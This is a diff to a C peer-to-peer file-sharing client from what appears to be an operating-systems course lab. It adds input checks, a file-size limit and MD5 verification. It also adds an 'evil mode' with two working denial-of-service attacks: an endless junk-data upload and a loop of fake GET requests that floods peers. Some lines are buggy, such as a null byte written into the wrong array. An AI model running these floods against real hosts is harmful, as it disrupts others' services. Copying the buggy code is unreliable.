@@ -40,6 +40,7 @@ static int listen_port;
 #define FILENAMESIZ	256	// Size of task_t::filename
 #define MAXNFILE 4096	//maximum number of files to be downloaed
 #define MAXNPEER 4096	//maximum number of upload peers
+#define MAXFILESIZE 1048576 //maximum file size (1MB). Avoid resource exhausting
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -65,7 +66,8 @@ typedef struct task {
 	unsigned head;
 	unsigned tail;
 	size_t total_written;	// Total number of bytes written
-				// by write_to_taskbuf
+												// by write_to_taskbuf
+  int total_amt;			// used for counting data in buffer, avoid overflow
 
 	char filename[FILENAMESIZ];	// Requested filename
 	char disk_filename[FILENAMESIZ]; // Local filename (TASK_DOWNLOAD)
@@ -75,6 +77,7 @@ typedef struct task {
 				// function initializes this list;
 				// task_pop_peer() removes peers from it, one
 				// at a time, if a peer misbehaves.
+	md5_state_t pms;	//extra credit: md5 checksum
 } task_t;
 
 
@@ -93,6 +96,7 @@ static task_t *task_new(tasktype_t type)
 	t->peer_fd = t->disk_fd = -1;
 	t->head = t->tail = 0;
 	t->total_written = 0;
+	t->total_amt = 0;
 	t->peer_list = NULL;
 
 	strcpy(t->filename, "");
@@ -150,8 +154,10 @@ typedef enum taskbufresult {		// Status of a read or write attempt.
 	TBUF_ERROR = -1,		// => Error; close the connection.
 	TBUF_END = 0,			// => End of file, or buffer is full.
 	TBUF_OK = 1,			// => Successfully read data.
-	TBUF_AGAIN = 2			// => Did not read data this time.  The
+	TBUF_AGAIN = 2,			// => Did not read data this time.  The
 					//    caller should wait.
+  TBUF_OVERFLOW = 3,	//buffer overflow
+  TBUF_TOOLARGE = 4,	//too large file
 } taskbufresult_t;
 
 // read_to_taskbuf(fd, t)
@@ -174,18 +180,25 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 	if (amt == -1 && (errno == EINTR || errno == EAGAIN
 			  || errno == EWOULDBLOCK))
   {
-  	message("read_to_taskbuf: %s\n", strerror(errno));
+  	error("read_to_taskbuf: %s\n", strerror(errno));
 		return TBUF_AGAIN;
 	}
 	else if (amt == -1)
 	{
-		message("read_to_taskbuf: %s\n", strerror(errno));
+		error("read_to_taskbuf: %s\n", strerror(errno));
 		return TBUF_ERROR;
 	}
 	else if (amt == 0)
 		return TBUF_END;
 	else {
+		//message("read_to_taskbuf: amt=%d\n",amt);
+		//BUG here: What if t->tail overweite t->head
 		t->tail += amt;
+		//FIX THE BUG HERE!
+		t->total_amt += amt;
+		if(t->total_amt > TASKBUFSIZ)
+			return TBUF_OVERFLOW;
+			
 		return TBUF_OK;
 	}
 }
@@ -202,10 +215,16 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
 
 	if (t->head == t->tail)
 		return TBUF_END;
-	else if (headpos < tailpos)
+	else if (headpos < tailpos){
 		amt = write(fd, &t->buf[headpos], tailpos - headpos);
-	else
+		//extra credit: update md5
+		md5_append(&(t->pms), (const md5_byte_t *)&t->buf[headpos], tailpos - headpos);
+	}
+	else{
 		amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);
+		//extra credit: update md5
+		md5_append(&(t->pms), (const md5_byte_t *)&t->buf[headpos], TASKBUFSIZ - headpos);
+	}
 
 	if (amt == -1 && (errno == EINTR || errno == EAGAIN
 			  || errno == EWOULDBLOCK))
@@ -223,6 +242,12 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
 	else {
 		t->head += amt;
 		t->total_written += amt;
+		t->total_amt -= amt;
+		if(t->total_amt < 0 )
+			return TBUF_OVERFLOW;
+		//if we are in evil mode, we will send huge amount of data
+		if(!evil_mode && t->total_written > MAXFILESIZE)	//too large file
+			return TBUF_TOOLARGE;
 		return TBUF_OK;
 	}
 }
@@ -491,7 +516,16 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	strcpy(t->filename, filename);
+	//BUG HERE: filename should be less than FILENAMESIZ
+	if(strlen(filename)<FILENAMESIZ)
+		strcpy(t->filename, filename);
+	else
+	{
+		error("ATTACK: long filename:%s\n",filename);
+		task_free(t);
+		t = NULL;
+		goto exit;
+	}
 
 	// add peers
 	s1 = tracker_task->buf;
@@ -572,7 +606,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
-	while (1) {
+while (1) {
 		//socket here!
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -588,7 +622,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 			goto try_again;
 		}
 	}
-
+	
 	// Empty files are usually a symptom of some error.
 	if (t->total_written > 0) {
 		message("* Downloaded '%s' was %lu bytes long\n",
@@ -629,7 +663,7 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 	for(i = 0; i != ntask; i++)
 		assert(!t[i] || t[i]->type == TASK_DOWNLOAD);
 	
-
+	
 	// Quit if no peers, and skip this peer
 	for(i = 0; i != ntask; i++)
 		if (!t[i] || !t[i]->peer_list) {
@@ -666,6 +700,9 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 		
 		//send requests!
 		osp2p_writef(t[i]->peer_fd, "GET %s OSP2P\n", t[i]->filename);	
+	
+		//initialize md5 checksum
+		md5_init(&(t[i]->pms));
 		
 		// Open disk file for the result.
 		// If the filename already exists, save the file in a name like
@@ -681,6 +718,8 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 			if (t[i]->disk_fd == -1 && errno != EEXIST) {
 				error("* Cannot open local file");
 				//goto try_again;
+				task_free(t[i]);
+				t[i] = NULL;
 				break;
 			} else if (t[i]->disk_fd != -1) {
 				message("* Saving result to '%s'\n", t[i]->disk_filename);
@@ -716,17 +755,47 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 		{
 			if(t[i]!=NULL && FD_ISSET(t[i]->peer_fd, &download_set))
 			{
+				//message("Task %d is active\n",i+1);
 				int ret = read_to_taskbuf(t[i]->peer_fd, t[i]);
 				if (ret == TBUF_ERROR) {
 					error("* Peer read error");
 					//goto try_again;
 					task_free(t[i]);
 					t[i] = NULL;
-				} else if (ret == TBUF_END && t[i]->head == t[i]->tail){
+					continue;
+				} else if (ret == TBUF_OVERFLOW) {
+					error("Buffer overflow\n");
+					task_free(t[i]);
+					t[i] = NULL;
+					continue;
+				}else if (ret == TBUF_END && t[i]->head == t[i]->tail){
 					/* End of file. So this task is done. */
 					if (t[i]->total_written > 0) {
 						message("* Downloaded '%s' was %lu bytes long\n",
 							t[i]->disk_filename, (unsigned long) t[i]->total_written);
+						//EXTRA CREDIT: data integretiy check
+						///////////////////////////////////////////////////////////////
+						  char checksum[MD5_TEXT_DIGEST_SIZE+1];
+						  md5_finish_text(&(t[i]->pms),checksum,1);
+						  checksum[MD5_TEXT_DIGEST_SIZE] = '\0';
+						  
+						  size_t messagepos;
+						  osp2p_writef(tracker_task->peer_fd, "MD5SUM %s\n",
+								     t[i]->filename);
+							messagepos = read_tracker_response(tracker_task);
+							tracker_task->buf[MD5_TEXT_DIGEST_SIZE]='\0';
+							//message("%s's checksum=%s our checksum=%s\n",t[i]->filename,tracker_task->buf,checksum);
+							if(strcmp(checksum,tracker_task->buf)==0)
+								message("* %s passed integrity check!\n",t[i]->filename);
+							else
+							{
+								error("* %s is corrupted!\n",t[i]->filename);
+								//unlink(t[i]->disk_filename);
+								task_free(t[i]);
+								t[i] = NULL;
+								continue;	
+							}
+						///////////////////////////////////////////////////////////////
 						// Inform the tracker that we now have the file,
 						// and can serve it to others!  (But ignore tracker errors.)
 						if (strcmp(t[i]->filename, t[i]->disk_filename) == 0) {
@@ -741,11 +810,22 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 					}				
 
 				}
+				
+				
 				//This function doesn't call socket
 				ret = write_from_taskbuf(t[i]->disk_fd, t[i]);
 				if (ret == TBUF_ERROR) {
 					error("* Disk write error: %s\n",t[i]->filename);
 					//goto try_again;
+					
+					task_free(t[i]);
+					t[i] = NULL;
+					continue;
+				}
+				else if(ret ==  TBUF_TOOLARGE){
+					error("* ATTACK: %s is too large (>%dMB). File transfer terminated.\n",t[i]->filename,MAXFILESIZE/1024/1024);
+					//goto try_again;
+					//unlink(t[i]->disk_filename);
 					task_free(t[i]);
 					t[i] = NULL;
 					continue;
@@ -772,6 +852,73 @@ static void task_download_parallel(task_t **t, size_t ntask, task_t *tracker_tas
 	
 }
 
+// task_download_DoS(t_array, ntask, tracker_task)
+// Rquest DoS attack
+static void task_download_DoS (task_t **t, size_t ntask, task_t *tracker_task)
+{
+	//if any one of them is not TASK_DOWNLOAD, it is an error!
+	//int i, ret = -1;
+	//assert((!t || t->type == TASK_DOWNLOAD)
+	       //&& tracker_task->type == TASK_TRACKER);
+	srand(time(NULL));	//generate random strings
+	size_t i, j; 
+	int ret = -1;
+	assert(tracker_task->type == TASK_TRACKER);
+	for(i = 0; i != ntask; i++)
+		assert(!t[i] || t[i]->type == TASK_DOWNLOAD);
+	
+
+	// Quit if no peers, and skip this peer
+	for(i = 0; i != ntask; i++)
+		if (!t[i] || !t[i]->peer_list) {
+			error("* No peers are willing to serve '%s'\n",
+			      (t[i] ? t[i]->filename : "that file"));
+			task_free(t[i]);
+			t[i] = NULL;
+		} else if (t[i]->peer_list->addr.s_addr == listen_addr.s_addr
+			   && t[i]->peer_list->port == listen_port) {
+			error("* IP:port is in conflict with listening socket: '%s'\n",
+			      (t[i] ? t[i]->filename : "that file"));
+			task_free(t[i]);
+			t[i] = NULL;
+		}
+	
+	// Connect to the peer and write the GET command	
+	while(1){
+		for(i = 0; i != ntask; i++)
+		{
+			if(t[i]!=0){
+				//For attack, fake the name
+				for(j = 0; j < 10; j++)
+					t[i]->filename[j]=rand();
+				t[9]='\0';
+				
+				message("* Connecting to %s:%d to download '%s'\n",
+				inet_ntoa(t[i]->peer_list->addr), t[i]->peer_list->port,
+				t[i]->filename);
+				//socket here!
+				t[i]->peer_fd = open_socket(t[i]->peer_list->addr, t[i]->peer_list->port);
+				if (t[i]->peer_fd == -1) {
+					error("* Cannot connect to peer: %s\n", strerror(errno));
+					continue;
+					//goto try_again;
+				}
+				
+				
+				
+				osp2p_writef(t[i]->peer_fd, "GET %s OSP2P\n", t[i]->filename);
+				
+				
+				//Once we send request, close the socket
+				close(t[i]->peer_fd);
+			}
+			
+			
+		}
+	}
+	
+	
+}
 
 // task_listen(listen_task)
 //	Accepts a connection from some other peer.
@@ -853,6 +1000,7 @@ static void task_upload(task_t *t)
 	message("* Upload of %s complete\n", t->filename);
 
     exit:
+  //FIXME: does not close socket
 	task_free(t);
 }
 
@@ -917,7 +1065,7 @@ static void task_upload_parallel(task_t *listen_task)
 					
 					if (ret == TBUF_ERROR) {
 						error("* Cannot read from connection");
-						task_free(t[i]);
+						
 						t[i] = NULL;
 						continue;
 					} 
@@ -926,48 +1074,103 @@ static void task_upload_parallel(task_t *listen_task)
 						
 						 //end of request: send data
 						 assert(t[i]->head == 0);
-						 if (osp2p_snscanf(t[i]->buf, t[i]->tail, "GET %s OSP2P\n", t[i]->filename) < 0) {
+						 //BUG HERE: what if filename is too long?
+						 //if (osp2p_snscanf(t[i]->buf, t[i]->tail, "GET %s OSP2P\n", t[i]->filename) < 0) {	
+						 if (osp2p_snscanf(t[i]->buf, FILENAMESIZ, "GET %s OSP2P\n", t[i]->filename) < 0) {	
 								error("* Odd request %.*s\n", t[i]->tail, t[i]->buf);
+								
 								task_free(t[i]);
 								t[i] = NULL;
 								continue;
 						 }
 						 t[i]->head = t[i]->tail = 0;
 						 
-						 t[i]->disk_fd = open(t[i]->filename, O_RDONLY);
-						 
-						 if (t[i]->disk_fd == -1) {
-							 error("* Cannot open file %s", t[i]->filename);
-							 //goto exit;
-							 task_free(t[i]);
-							 t[i] = NULL;
-							 continue;
+						 //Exercise 2: check whether the file is within the directory
+						 /////////////////////////////////////////////////////////////
+						 DIR *dir;
+						 struct dirent *ent;
+						 int exist = 0;
+						 if ((dir = opendir(".")) == NULL){
+							error("* open directory: %s", strerror(errno));
+							task_free(t[i]);
+							t[i] = NULL;
+							continue;
 						 }
+						 while ((ent = readdir(dir)) != NULL){
+							 	if(strcmp(t[i]->filename,ent->d_name)==0)
+							 	{exist = 1; break;}
+						 }
+						 if(!exist){
+						 		error("* %s is not in current directory!\n",t[i]->filename);
+						 		task_free(t[i]);
+						 		t[i]=NULL;
+						 		continue;
+						 }
+						 /*else
+						 	 message("* %s is in current directory!\n",t[i]->filename);*/
+						 /////////////////////////////////////////////////////////////
+						 //ATTACK 1: sends huge numbers of data to client
+						 //Since skeleton code processes request in sequential, such
+						 //attach would block other requests, and exhaust client's resource
+						 if(evil_mode==1){
+						 	 message("Attack #%d: upload huge amount of junk data\n",evil_mode);
+						 	 int count = 0;
+						 	 while (1){	//infinite loop
+						 	 	//Fill in junk data
+								t[i]->head = 0;
+								t[i]->tail = TASKBUFSIZ-1;
+						 	 	ret = write_from_taskbuf(t[i]->peer_fd, t[i]);
+								if (ret == TBUF_ERROR) {
+									error("* Peer write error");	
+									task_free(t[i]);
+									t[i] = NULL;
+									break;
+								}
+								
+						 	 }
+						 }
+						 else{	//normal data upload
+						 	 t[i]->disk_fd = open(t[i]->filename, O_RDONLY);
 						 
-						 message("* Transferring file %s\n", t[i]->filename);
-						 while (1) {
-							ret = write_from_taskbuf(t[i]->peer_fd, t[i]);
-							if (ret == TBUF_ERROR) {
-								error("* Peer write error");
-								task_free(t[i]);
-								t[i] = NULL;
-								break;
+							 if (t[i]->disk_fd == -1) {
+								 error("* Cannot open file %s", t[i]->filename);
+								 //goto exit;
+								 
+								 task_free(t[i]);
+								 t[i] = NULL;
+								 continue;
+							 }
+							 
+							 message("* Transferring file %s\n", t[i]->filename);
+							 while (1) {
+								ret = write_from_taskbuf(t[i]->peer_fd, t[i]);
+								if (ret == TBUF_ERROR) {
+									error("* Peer write error");
+									
+									task_free(t[i]);
+									t[i] = NULL;
+									break;
+								}
+						
+								ret = read_to_taskbuf(t[i]->disk_fd, t[i]);
+								if (ret == TBUF_ERROR) {
+									error("* Disk read error");
+									
+									task_free(t[i]);
+									t[i] = NULL;
+									break;
+								} else if (ret == TBUF_END && t[i]->head == t[i]->tail)
+									/* End of file */
+									break;
 							}
-					
-							ret = read_to_taskbuf(t[i]->disk_fd, t[i]);
-							if (ret == TBUF_ERROR) {
-								error("* Disk read error");
-								task_free(t[i]);
-								t[i] = NULL;
-								break;
-							} else if (ret == TBUF_END && t[i]->head == t[i]->tail)
-								/* End of file */
-								break;
-						}
-						if(ret != TBUF_ERROR)
-						message("* Upload of %s complete\n", t[i]->filename);
+							if(ret != TBUF_ERROR)
+							message("* Upload of %s complete\n", t[i]->filename);
+						 }
+						 	
+						 
 						
 						//free the task
+						
 						task_free(t[i]);
 						t[i] = NULL;
 						 
@@ -1083,14 +1286,26 @@ int main(int argc, char *argv[])
 			
 	// parallel version
 	task_t* t_array[MAXNFILE];
-	size_t ntask = 0;
-	for(; argc > 1; argc--, argv++)
-		if((t = start_download(tracker_task, argv[1])))
-		{
-			t_array[ntask] = t;
-			ntask++;
-		}
-	task_download_parallel(t_array, ntask, tracker_task);
+		size_t ntask = 0;
+		for(; argc > 1; argc--, argv++)
+			if((t = start_download(tracker_task, argv[1])))
+			{
+				t_array[ntask] = t;
+				ntask++;
+			}
+	if(evil_mode==2)
+	{
+		message("Attack #%d: DoS due to faked requests\n",evil_mode);
+		//first get valid IP from tracker by sending valid data name
+		//then send a huge number of fake data name to client
+		//Since skeleton code processes request in sequential, this would block client
+		task_download_DoS(t_array, ntask, tracker_task);
+		
+	}
+	else{
+		task_download_parallel(t_array, ntask, tracker_task);
+	}
+	
 	
 	//skeleton code version
 	/*while ((t = task_listen(listen_task)))
